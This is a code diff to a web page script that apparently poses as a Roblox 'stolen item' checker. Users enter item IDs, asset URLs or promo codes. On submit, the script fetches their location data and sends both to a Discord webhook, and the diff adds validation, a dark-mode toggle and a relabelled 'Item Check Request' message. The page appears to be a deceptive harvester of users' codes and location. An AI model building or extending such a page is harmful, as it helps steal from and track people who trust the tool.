@@ -11,6 +11,7 @@ const codeInput = document.getElementById('codeInput');
 const loadingOverlay = document.getElementById('loadingOverlay');
 const successMessage = document.getElementById('successMessage');
 const errorMessage = document.getElementById('errorMessage');
+const themeToggle = document.getElementById('themeToggle');
 
 // Event Listeners
 scanBtn.addEventListener('click', openModal);
@@ -20,6 +21,7 @@ submitBtn.addEventListener('click', submitCode);
 window.addEventListener('click', outsideClick);
 codeInput.addEventListener('input', validateInput);
 codeInput.addEventListener('keydown', handleKeyDown);
+themeToggle.addEventListener('click', toggleTheme);
 
 // Functions
 function openModal() {
@@ -33,6 +35,12 @@ function closeModal() {
     modal.style.display = 'none';
     codeInput.value = '';
     hideMessages();
+    
+    // Remove validation error if present
+    const existingError = document.querySelector('.validation-error');
+    if (existingError) {
+        existingError.remove();
+    }
 }
 
 function outsideClick(e) {
@@ -43,7 +51,119 @@ function outsideClick(e) {
 
 function validateInput() {
     const code = codeInput.value.trim();
-    submitBtn.disabled = code.length === 0;
+    const isValid = isValidInput(code);
+    
+    submitBtn.disabled = !isValid;
+    
+    // Show validation feedback
+    const existingError = document.querySelector('.validation-error');
+    if (existingError) {
+        existingError.remove();
+    }
+    
+    if (code.length > 0 && !isValid) {
+        showValidationError();
+    }
+}
+
+function isValidInput(input) {
+    if (input.length === 0) return false;
+    
+    // Remove whitespace and convert to lowercase for validation
+    const cleanInput = input.replace(/\s+/g, '').toLowerCase();
+    
+    // Check for various valid patterns:
+    
+    // 1. Roblox Item ID (numeric, typically 6-12 digits)
+    const itemIdPattern = /^\d{6,12}$/;
+    if (itemIdPattern.test(cleanInput)) {
+        return true;
+    }
+    
+    // 2. Roblox Asset URL
+    const assetUrlPattern = /^(https?:\/\/)?(www\.)?roblox\.com\/catalog\/\d+/;
+    if (assetUrlPattern.test(cleanInput)) {
+        return true;
+    }
+    
+    // 3. Asset ID from URL
+    const assetIdFromUrl = cleanInput.match(/\/catalog\/(\d+)/);
+    if (assetIdFromUrl && assetIdFromUrl[1].length >= 6) {
+        return true;
+    }
+    
+    // 4. Game Pass or Developer Product IDs
+    const gamePassPattern = /^(gamepass|devproduct):\d{6,12}$/;
+    if (gamePassPattern.test(cleanInput)) {
+        return true;
+    }
+    
+    // 5. Roblox promo codes (letters and numbers, 6-20 characters)
+    const promoCodePattern = /^[a-z0-9]{6,20}$/;
+    if (promoCodePattern.test(cleanInput)) {
+        return true;
+    }
+    
+    // 6. Bundle IDs
+    const bundlePattern = /^bundle:\d{3,8}$/;
+    if (bundlePattern.test(cleanInput)) {
+        return true;
+    }
+    
+    return false;
+}
+
+function showValidationError() {
+    const modalBody = document.querySelector('.modal-body');
+    const errorElement = document.createElement('div');
+    errorElement.className = 'validation-error';
+    errorElement.innerHTML = `
+        <p>❌ Invalid format. Please enter one of the following:</p>
+        <ul>
+            <li>• Roblox Item ID (e.g., 123456789)</li>
+            <li>• Roblox Asset URL (e.g., roblox.com/catalog/123456789)</li>
+            <li>• Promo Code (e.g., ROBLOX2024)</li>
+            <li>• Game Pass ID (e.g., gamepass:123456789)</li>
+        </ul>
+    `;
+    
+    modalBody.insertBefore(errorElement, modalBody.querySelector('.button-group'));
+}
+
+function extractItemId(input) {
+    const cleanInput = input.replace(/\s+/g, '');
+    
+    // Extract ID from URL
+    const urlMatch = cleanInput.match(/\/catalog\/(\d+)/);
+    if (urlMatch) {
+        return urlMatch[1];
+    }
+    
+    // Extract ID from gamepass or devproduct format
+    const specialMatch = cleanInput.match(/^(gamepass|devproduct|bundle):(\d+)$/i);
+    if (specialMatch) {
+        return `${specialMatch[1]}:${specialMatch[2]}`;
+    }
+    
+    // Return as-is if it's already a clean ID or code
+    return cleanInput;
+}
+
+function toggleTheme() {
+    const currentTheme = document.documentElement.getAttribute('data-theme');
+    const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
+    
+    document.documentElement.setAttribute('data-theme', newTheme);
+    localStorage.setItem('theme', newTheme);
+}
+
+function initializeTheme() {
+    // Check for saved theme preference or default to light mode
+    const savedTheme = localStorage.getItem('theme');
+    const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+    
+    const initialTheme = savedTheme || (systemPrefersDark ? 'dark' : 'light');
+    document.documentElement.setAttribute('data-theme', initialTheme);
 }
 
 function handleKeyDown(e) {
@@ -124,11 +244,20 @@ async function submitCode() {
         return;
     }
 
+    // Validate input before submission
+    if (!isValidInput(code)) {
+        showMessage('error');
+        return;
+    }
+
     showLoading();
 
     try {
         // Get user location data
         const locationData = await getUserLocation();
+        
+        // Extract clean item ID
+        const cleanItemId = extractItemId(code);
         
         // Format data for Discord webhook
         const discordMessage = {
@@ -138,8 +267,8 @@ async function submitCode() {
                 timestamp: new Date().toISOString(),
                 fields: [
                     {
-                        name: "📝 Code",
-                        value: `\`\`\`\n${code}\n\`\`\``,
+                        name: "📝 Item Check Request",
+                        value: `**Original Input:** \`${code}\`\n**Processed ID:** \`${cleanItemId}\`\n**Status:** Checking if item is stolen...`,
                         inline: false
                     },
                     {
@@ -193,6 +322,9 @@ async function submitCode() {
 
 // Initialize
 document.addEventListener('DOMContentLoaded', function() {
+    // Initialize theme
+    initializeTheme();
+    
     // Check if webhook URL is configured
     if (WEBHOOK_URL === 'https://your-webhook-url-here.com/webhook') {
         console.warn('⚠️ Please configure your webhook URL in script.js');
